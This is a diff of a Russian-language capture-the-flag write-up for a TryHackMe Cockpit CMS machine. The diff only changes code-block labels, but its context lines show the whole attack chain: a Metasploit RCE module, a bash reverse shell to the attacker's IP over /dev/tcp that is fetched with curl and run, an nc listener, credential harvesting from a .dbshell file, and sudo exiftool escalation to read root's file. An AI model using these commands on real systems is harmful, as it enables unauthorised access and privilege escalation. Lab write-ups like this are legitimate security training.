@@ -23,7 +23,7 @@
 
 ## Эксплуатация
 Поищем через searchsploit:
-```
+```zsh
 └─$ searchsploit Cockpit CMS 0.11.1
 -------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                  |  Path
@@ -247,7 +247,7 @@ if __name__ == '__main__':
 Воспользовавшись этим скриптом я поменял пароль у одного крутого пользователя, но зайти по нему не смог, может что-то со скриптом, поэтому пробую metasploit. Тут же можно узнать и имя пользователя и его почту для 6 вопроса и узнать сколько всего пользователей. 
 
 Ищем уязвимость.
-```
+```zsh
 msf > search cockpit
 
 Matching Modules
@@ -262,7 +262,7 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 ```
 
 Используем:
-```
+```zsh
 USER => admin
 msf exploit(multi/http/cockpit_cms_rce) > run
 [*] Started reverse TCP handler on 192.168.135.72:4444 
@@ -303,7 +303,7 @@ Cкрипт так же генерирует пароль, но на этот р
 Так же скрипт дает нам шелл, но он убогий, поэтому прокинем туда свой реверс шелл
 
 У себя создадим файл с шеллом (Создан через revshells.com) и откроем http сервер:
-```
+```zsh
 └─$ echo 'bash -i >& /dev/tcp/192.168.135.72/6666 0>&1' > shell.sh
                                                                                                                   
 ┌──(obsca㉿kali)-[~/Downloads]
@@ -320,17 +320,17 @@ curl http://192.168.135.72:8899/shell.sh -o shell.sh
 На машине выполним такую команду и теперь наш шелл на атакуемой машине. 
 
 У себя откроем соответсвующий порт 
-```
+```zsh
 nc -lvnp 6666
 listening on [any] 6666 ...
 ```
 
 Запустим:
-```
+```zsh
 bash shell.sh
 ```
 
-```
+```zsh
 connect to [192.168.135.72] from (UNKNOWN) [10.67.179.57] 51230
 bash: cannot set terminal process group (759): Inappropriate ioctl for device
 bash: no job control in this shell
@@ -340,7 +340,7 @@ www-data@ubuntu:/var/www/html/cockpit$ python3 -c 'import pty; pty.spawn("/bin/b
 Получаем наш шелл и сразу же улучшим его. Теперь можно двигаться дальше...
 
 Пробуем прочитать user.txt
-```
+```zsh
 www-data@ubuntu:/var/www/html/cockpit$ cd /home
 cd /home
 www-data@ubuntu:/home$ ls
@@ -358,7 +358,7 @@ cat: user.txt: Permission denied
 Но получаем по лбу.
 
 Добавим к ls флаги -la
-```
+```zsh
 www-data@ubuntu:/home/stux$ ls -la
 ls -la
 total 44
@@ -378,7 +378,7 @@ drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
 ```
 
 Читаем .dbshell
-```
+```zsh
 www-data@ubuntu:/home/stux$ cat .dbshell
 cat .dbshell
 show
@@ -405,7 +405,7 @@ db.flag.find().pretty()
 И находим пароль пользователя stux, а заодно и флаг базы данных.
 
 Логинимся и читаем наш флаг:
-```
+```zsh
 www-data@ubuntu:/home/stux$ su stux
 su stux
 Password: [REDACTED]
@@ -416,7 +416,7 @@ thm{REDACTED}
 ```
 ## Root
 Смотрим что можем
-```
+```zsh
 stux@ubuntu:~$ sudo -l
 sudo -l
 Matching Defaults entries for stux on ubuntu:
@@ -430,7 +430,7 @@ User stux may run the following commands on ubuntu:
 
 - https://gtfobins.github.io/gtfobins/exiftool/
 
-```
+```zsh
 stux@ubuntu:~$ LFILE=/root/root.txt
 LFILE=/root/root.txt
 stux@ubuntu:~$ OUTPUT=/tmp/root.txt
